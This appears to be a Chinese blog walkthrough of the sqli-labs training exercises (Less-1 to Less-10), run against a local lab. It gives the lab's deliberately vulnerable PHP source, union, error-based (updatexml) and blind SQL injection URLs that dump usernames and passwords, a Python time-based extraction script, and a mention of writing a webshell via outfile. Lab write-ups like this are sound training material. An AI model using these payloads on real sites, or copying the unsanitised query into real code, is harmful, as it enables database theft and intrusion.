<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html <span class="keyword">PUBLIC</span> <span class="string">&quot;-//W3C//DTD XHTML 1.0 Transitional//EN&quot;</span> <span class="string">&quot;http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd&quot;</span>&gt;</span><br><span class="line">&lt;html xmlns=<span class="string">&quot;http://www.w3.org/1999/xhtml&quot;</span>&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;meta http-equiv=<span class="string">&quot;Content-Type&quot;</span> content=<span class="string">&quot;text/html; charset=utf-8&quot;</span> /&gt;</span><br><span class="line">&lt;title&gt;Less<span class="number">-1</span> **<span class="built_in">Error</span> Based- <span class="keyword">String</span>**&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line"></span><br><span class="line">&lt;body bgcolor=<span class="string">&quot;#000000&quot;</span>&gt;</span><br><span class="line">&lt;div style=<span class="string">&quot; margin-top:70px;color:#FFF; font-size:23px; text-align:center&quot;</span>&gt;Welcome&amp;nbsp;&amp;nbsp;&amp;nbsp;&lt;font color=<span class="string">&quot;#FF0000&quot;</span>&gt; Dhakkan &lt;/font&gt;&lt;br&gt;</span><br><span class="line">&lt;font size=<span class="string">&quot;3&quot;</span> color=<span class="string">&quot;#FFFF00&quot;</span>&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//including the Mysql connect parameters.</span></span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;../sql-connections/sql-connect.php&quot;</span>);</span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="comment">// take the variables </span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">&#x27;id&#x27;</span>]))</span><br><span class="line">&#123;</span><br><span class="line">$id=$_GET[<span class="string">&#x27;id&#x27;</span>];</span><br><span class="line"><span class="comment">//logging the connection parameters to a file for analysis.</span></span><br><span class="line">$fp=fopen(<span class="string">&#x27;result.txt&#x27;</span>,<span class="string">&#x27;a&#x27;</span>);</span><br><span class="line">fwrite($fp,<span class="string">&#x27;ID:&#x27;</span>.$id.<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">fclose($fp);</span><br><span class="line"></span><br><span class="line"><span class="comment">// connectivity </span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">$sql=<span class="string">&quot;SELECT * FROM users WHERE id=&#x27;$id&#x27; LIMIT 0,1&quot;</span>;</span><br><span class="line">$result=mysql_query($sql);</span><br><span class="line">$row = mysql_fetch_array($result);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>($row)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">echo</span> <span class="string">&quot;&lt;font size=&#x27;5&#x27; color= &#x27;#99FF00&#x27;&gt;&quot;</span>;</span><br><span class="line">      <span class="keyword">echo</span> <span class="string">&#x27;Your Login name:&#x27;</span>. $row[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line">      <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">      <span class="keyword">echo</span> <span class="string">&#x27;Your Password:&#x27;</span> .$row[<span class="string">&#x27;password&#x27;</span>];</span><br><span class="line">      <span class="keyword">echo</span> <span class="string">&quot;&lt;/font&gt;&quot;</span>;</span><br><span class="line">      &#125;</span><br><span class="line">    <span class="keyword">else</span> </span><br><span class="line">    &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;&lt;font color= &quot;#FFFF00&quot;&gt;&#x27;</span>;</span><br><span class="line">    print_r(mysql_error());</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;/font&gt;&quot;</span>;  </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">    <span class="keyword">else</span> &#123; <span class="keyword">echo</span> <span class="string">&quot;Please input the ID as parameter with numeric value&quot;</span>;&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;/font&gt; &lt;/div&gt;&lt;/br&gt;&lt;/br&gt;&lt;/br&gt;&lt;center&gt;</span><br><span class="line">&lt;img src=<span class="string">&quot;../images/Less-1.jpg&quot;</span> /&gt;&lt;/center&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>
<p><code>$sql=&quot;SELECT * FROM users WHERE id=&#39;$id&#39; LIMIT 0,1&quot;;</code><br>他直接获取了我们的id，填了进去，那么我们闭合前面的引号，注释后面的语句</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$sql=<span class="string">&quot;SELECT * FROM users WHERE id=&#x27;-1&#x27; union select 1,2,3 --+&#x27; LIMIT 0,1&quot;</span>;</span><br></pre></td></tr></table></figure>
<p>这是最后的语句<br><img src="https://img-blog.csdnimg.cn/20200728191754467.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2h4aHhoeGh4eA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>我们查看他的数据库，security数据库</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;sqli-labs&#x2F;Less-1&#x2F;?id&#x3D;-1&#39; union select 1,2,group_concat(table_name) from information_schema.tables where table_schema&#x3D;&#39;security&#39;--+</span><br></pre></td></tr></table></figure>
<p><img src="https://img-blog.csdnimg.cn/2020072819200848.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2h4aHhoeGh4eA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>group_concat 可以将所有的tables 提取出来<br>information_schema是mysql特有的库，存储各种数据库的信息<br><img src="https://img-blog.csdnimg.cn/20200728192809184.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2h4aHhoeGh4eA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
<p>我们查询他的字段<br>然后我们查询他的值，<br><img src="https://img-blog.csdnimg.cn/20200728193231664.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2h4aHhoeGh4eA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>查询密码<br><img src="https://img-blog.csdnimg.cn/2020072819324892.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2h4aHhoeGh4eA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
<h3 id="GET-Error-based-Intiger-based-基于错误的GET整型注入"><a href="#GET-Error-based-Intiger-based-基于错误的GET整型注入" class="headerlink" title="GET - Error based - Intiger based (基于错误的GET整型注入)"></a>GET - Error based - Intiger based (基于错误的GET整型注入)</h3><p><img src="https://img-blog.csdnimg.cn/20200728195958975.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2h4aHhoeGh4eA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>这里我们没有加入单引号<br>及为整形<br><img src="https://img-blog.csdnimg.cn/20200728200103231.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2h4aHhoeGh4eA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>源码这里和上面第一题，有明显不同<br><img src="https://img-blog.csdnimg.cn/20200728200142602.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2h4aHhoeGh4eA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>其余注入和第一题完全一致</p>
<h3 id="Less-3-GET-Error-based-Single-quotes-with-twist-string-基于错误的GET单引号变形字符型注入"><a href="#Less-3-GET-Error-based-Single-quotes-with-twist-string-基于错误的GET单引号变形字符型注入" class="headerlink" title="Less-3 GET - Error based - Single quotes with twist string (基于错误的GET单引号变形字符型注入)"></a>Less-3 GET - Error based - Single quotes with twist string (基于错误的GET单引号变形字符型注入)</h3><p><img src="https://img-blog.csdnimg.cn/20200728212957383.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2h4aHhoeGh4eA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>查看源码我们发现<br>如果我们正常注入时，总归括号不能合并，那么我们<br><img src="https://img-blog.csdnimg.cn/20200728213401676.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2h4aHhoeGh4eA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;sqli-labs&#x2F;Less-3&#x2F;?id&#x3D;-1&#39;) union select 1,2,3 --+</span><br></pre></td></tr></table></figure>
<p>这样，语句就被我们闭合</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$sql=<span class="string">&quot;SELECT * FROM users WHERE id=(&#x27;-1&#x27;) union select 1,2,3 --+&#x27;) LIMIT 0,1&quot;</span>;</span><br></pre></td></tr></table></figure>
<p>其余注入和第一题讲解一致</p>
<h3 id="Less-4-GET-Error-based-Double-Quotes-String-（基于错误的GET双引号字符型注入）"><a href="#Less-4-GET-Error-based-Double-Quotes-String-（基于错误的GET双引号字符型注入）" class="headerlink" title="Less-4 GET - Error based - Double Quotes - String （基于错误的GET双引号字符型注入）"></a>Less-4 GET - Error based - Double Quotes - String （基于错误的GET双引号字符型注入）</h3><p><img src="https://img-blog.csdnimg.cn/20200728213707208.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2h4aHhoeGh4eA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>那么我们考虑如何将前面的闭合<br><img src="https://img-blog.csdnimg.cn/20200728213843483.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2h4aHhoeGh4eA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;sqli-labs&#x2F;Less-4&#x2F;?id&#x3D;-1&quot;) union select 1,2,3 --+</span><br></pre></td></tr></table></figure>
<p>那么我们闭合完成的语句是<br><img src="https://img-blog.csdnimg.cn/20200728214019870.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2h4aHhoeGh4eA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>其余和第一题注入一致</p>
<h3 id="Less-5-GET-Double-Injection-Single-Quotes-String-双注入GET单引号字符型注入"><a href="#Less-5-GET-Double-Injection-Single-Quotes-String-双注入GET单引号字符型注入" class="headerlink" title="Less-5 GET - Double Injection - Single Quotes - String (双注入GET单引号字符型注入)"></a>Less-5 GET - Double Injection - Single Quotes - String (双注入GET单引号字符型注入)</h3><p><img src="https://img-blog.csdnimg.cn/20200728214143466.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2h4aHhoeGh4eA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20200728214354223.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2h4aHhoeGh4eA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20200728214435111.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2h4aHhoeGh4eA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>正常闭合，显示正确<br>我们如果看到这样的报错信息，首先想到的就是布尔型盲注、报错型注入、时间延迟型盲注了，可以看他浏览器的反应来判断，这类型直接拿sqlmap跑就行，这里手工仅仅简单注入一下，毕竟这个工程量很大，</p>
<h4 id="关于时间的盲注"><a href="#关于时间的盲注" class="headerlink" title="关于时间的盲注"></a>关于时间的盲注</h4><p><img src="https://img-blog.csdnimg.cn/20200814144414767.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2h4aHhoeGh4eA==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>可以发现有明显延迟<br><img src="https://img-blog.csdnimg.cn/2020081414485459.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2h4aHhoeGh4eA==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>我们可以盲注，<code>?id=1&#39; and length(database())=8</code><br>=8正好，一般情况需要考虑<br><code>&gt;8 &lt;8</code></p>
<p>接下来我们就可以使用一位一位的判断<br>可以自己写脚本，也可以burp</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># coding:utf-8</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> datetime</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line"><span class="comment"># 获取数据库名长度</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">database_len</span>():</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>, <span class="number">10</span>):</span><br><span class="line">        url = <span class="string">&quot;http://127.0.0.1/sqli-labs/Less-5/index.php&quot;</span></span><br><span class="line">        payload = <span class="string">&quot; ?id=1&#x27; and if(length(database())&gt;%s,sleep(1),0) --+&quot;</span> % i</span><br><span class="line">        <span class="comment"># print(url+payload+&#x27;%23&#x27;)</span></span><br><span class="line">        time1 = datetime.datetime.now()</span><br><span class="line">        r = requests.get(url + payload)</span><br><span class="line">        time2 = datetime.datetime.now()</span><br><span class="line">        sec = (time2 - time1).seconds</span><br><span class="line">        <span class="keyword">if</span> sec &gt;= <span class="number">1</span>:</span><br><span class="line">            print(i)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            print(i)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    print(<span class="string">&#x27;database_len:&#x27;</span>, i)</span><br><span class="line"></span><br><span class="line"><span class="comment">#获取数据库名</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">database_name</span>():</span></span><br><span class="line">    name = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">9</span>):</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="string">&#x27;0123456789abcdefghijklmnopqrstuvwxyz&#x27;</span>:</span><br><span class="line">            url = <span class="string">&quot;http://127.0.0.1/sqli-labs/Less-5/index.php&quot;</span></span><br><span class="line">            payload = <span class="string">&quot;?id=1&#x27; and if(substr(database(),%d,1)=&#x27;%s&#x27;,sleep(3),1) --+&quot;</span> % (j,i)</span><br><span class="line">            <span class="comment">#print(url+payload)</span></span><br><span class="line">            time1 = datetime.datetime.now()</span><br><span class="line">            r = requests.get(url + payload)</span><br><span class="line">            time2 = datetime.datetime.now()</span><br><span class="line">            sec = (time2 - time1).seconds</span><br><span class="line">            <span class="keyword">if</span> sec &gt;=<span class="number">3</span>:</span><br><span class="line">                name += i</span><br><span class="line">                print(name)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">    print(<span class="string">&#x27;database_name:&#x27;</span>, name)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    database_name()</span><br></pre></td></tr></table></figure>
<p><img src="https://img-blog.csdnimg.cn/20200814154800335.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2h4aHhoeGh4eA==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20200814155521543.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2h4aHhoeGh4eA==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br><code>?id=1&#39; and if(substr(database(),%d,1)=&#39;%s&#39;,sleep(3),1) -- +</code><br>暴表：<br><code>?id=1&#39; and if(substr(select table_ name from information_schema.tables where table_schema=database(),%d,1))</code><br>爆列：<br><code>?id=1&#39; and if(substr(select columns_name from infomation_schema.columns where table_shema=database(),%d,1))</code></p>
<h4 id="还可以进行xpath注入"><a href="#还可以进行xpath注入" class="headerlink" title="还可以进行xpath注入"></a>还可以进行xpath注入</h4><p>因为这里并不是完全的无回显，所以我们试试updatexml报错注入<br><img src="https://img-blog.csdnimg.cn/20200814170443301.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2h4aHhoeGh4eA==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br><code>http://192.168.2.222/sqli-labs-master/Less-5/?id=1&#39; and updatexml(1,concat(0x5e,database(),0x5e),1) --+</code>,database()处可换成任意SQL语句。<br><img src="https://img-blog.csdnimg.cn/20200814170744537.png#pic_center" alt="在这里插入图片描述"></p>
<p><code>测试：http://192.168.2.222/sqli-labs-master/Less-5/?id=1&#39; and updatexml(1,concat(0x5e,(select group_concat(username,0x7e,password) from users),0x5e),1) --+</code></p>
<p>报错： <code> XPATH syntax error: ‘^Dumb~Dumb,Angelina~I-kill-you,D’ ,此时出现了一个小问题，我闷尝试这把所有内容爆出来，但是这里显示不全？原因就是我们的concat(0x5e,1,0x5e),如果完整的话，那么出现的内容两边必有</code>^(0x5e).所有这个右边还有内容没报错出来。</p>
<p>我们可以用substr函数，截取，最后在拼接。<code> http://192.168.2.222/sqli-labs-master/Less-5/?id=1&#39; and updatexml(1,concat(0x5e,(substr((select group_concat(username,0x7e,password) from users),1)),0x5e),1) --+</code></p>
<p>可将substr函数里的1处依次加31.（因为每次只能查出31为字符）<br><img src="https://img-blog.csdnimg.cn/20200814170754322.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2h4aHhoeGh4eA==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p>
<h3 id="Less-6-GET-Double-Injection-Double-Quotes-String-双注入GET双引号字符型注入"><a href="#Less-6-GET-Double-Injection-Double-Quotes-String-双注入GET双引号字符型注入" class="headerlink" title="Less-6 GET - Double Injection - Double Quotes - String (双注入GET双引号字符型注入)"></a>Less-6 GET - Double Injection - Double Quotes - String (双注入GET双引号字符型注入)</h3><p><img src="https://img-blog.csdnimg.cn/202008141441275.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2h4aHhoeGh4eA==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>查询了第一个，输入的id使用“包裹，其余和第五关一致<br>所以只需要我们换成双引号即可</p>
<h3 id="Less-7-GET-Dump-into-outfile-String-（导出文件GET字符型注入）"><a href="#Less-7-GET-Dump-into-outfile-String-（导出文件GET字符型注入）" class="headerlink" title="Less-7 GET - Dump into outfile - String （导出文件GET字符型注入）"></a>Less-7 GET - Dump into outfile - String （导出文件GET字符型注入）</h3><p><img src="https://img-blog.csdnimg.cn/20200814171551837.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2h4aHhoeGh4eA==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>当我们准备闭合语句时候，<br>发现<code>1&#39;))</code>可以闭合<br><img src="https://img-blog.csdnimg.cn/20200814172129959.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2h4aHhoeGh4eA==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>发现有三列<br><img src="https://img-blog.csdnimg.cn/2020081418050998.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2h4aHhoeGh4eA==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>我们将my.ini进行修改后，可以进行写入文件<br>再经过一系列修改之后终于可以了，<br>帮忙踩个坑，这里我们修改secure时候记得重启电脑，因为phpstudy自己的bug，这里我们写入一句话连接即可</p>
<p><img src="https://img-blog.csdnimg.cn/20200814221910409.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2h4aHhoeGh4eA==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p>
<p><img src="https://img-blog.csdnimg.cn/20200814195633552.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2h4aHhoeGh4eA==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p>
<h4 id="所用函数"><a href="#所用函数" class="headerlink" title="所用函数"></a>所用函数</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Length（）函数 返回字符串的长度</span><br><span class="line">Substr（）截取字符串</span><br><span class="line">Ascii（）返回字符的ascii码</span><br><span class="line">sleep(n)：将程序挂起一段时间 n为n秒</span><br><span class="line">if(expr1,expr2,expr3):判断语句 如果第一个语句正确就执行第二个语句如果错误执行第三个语句</span><br></pre></td></tr></table></figure>

<h3 id="Less-8-GET-Blind-Boolian-Based-Single-Quotes-布尔型单引号GET盲注"><a href="#Less-8-GET-Blind-Boolian-Based-Single-Quotes-布尔型单引号GET盲注" class="headerlink" title="Less-8 GET - Blind - Boolian Based - Single Quotes (布尔型单引号GET盲注)"></a>Less-8 GET - Blind - Boolian Based - Single Quotes (布尔型单引号GET盲注)</h3><p><img src="https://img-blog.csdnimg.cn/20200815095224891.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2h4aHhoeGh4eA==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>当我们输入1‘时，发现闭合<br>没有回显，我们试试盲注<br><img src="https://img-blog.csdnimg.cn/20200815101338922.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2h4aHhoeGh4eA==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>因为本地比较慢，，同时延时5秒，因此延迟了<br>而且她第一个字符是s<br><img src="https://img-blog.csdnimg.cn/20200815101446307.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2h4aHhoeGh4eA==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>可以看到有明显差别<br><img src="https://img-blog.csdnimg.cn/20200815101857349.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2h4aHhoeGh4eA==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p>
<p>或者我们可以使用ascii码来进行查找<br><code>http://127.0.0.1/sqli-labs/Less-8/?id=1&#39; and if(ascii(substr(database(),1,1))&gt;1,sleep(5),sleep(1)) --+</code><br>从1-128，<br>substr的话从第一位取一个，到第八位取一个<br>其他同less5</p>
<h3 id="Less-9-GET-Blind-Time-based-Single-Quotes-基于时间的GET单引号盲注"><a href="#Less-9-GET-Blind-Time-based-Single-Quotes-基于时间的GET单引号盲注" class="headerlink" title="Less-9 GET - Blind - Time based. -  Single Quotes  (基于时间的GET单引号盲注)"></a>Less-9 GET - Blind - Time based. -  Single Quotes  (基于时间的GET单引号盲注)</h3><p><img src="https://img-blog.csdnimg.cn/20200815103002902.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2h4aHhoeGh4eA==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>发现这样的时间的盲注仍然可行~<br>那么结果就同less5了</p>
<h3 id="Less-10-GET-Blind-Time-based-double-quotes-基于时间的双引号盲注"><a href="#Less-10-GET-Blind-Time-based-double-quotes-基于时间的双引号盲注" class="headerlink" title="Less-10 GET - Blind - Time based - double quotes (基于时间的双引号盲注)"></a>Less-10 GET - Blind - Time based - double quotes (基于时间的双引号盲注)</h3><p><img src="https://img-blog.csdnimg.cn/20200815103520882.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2h4aHhoeGh4eA==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>其余同9喽~</p>
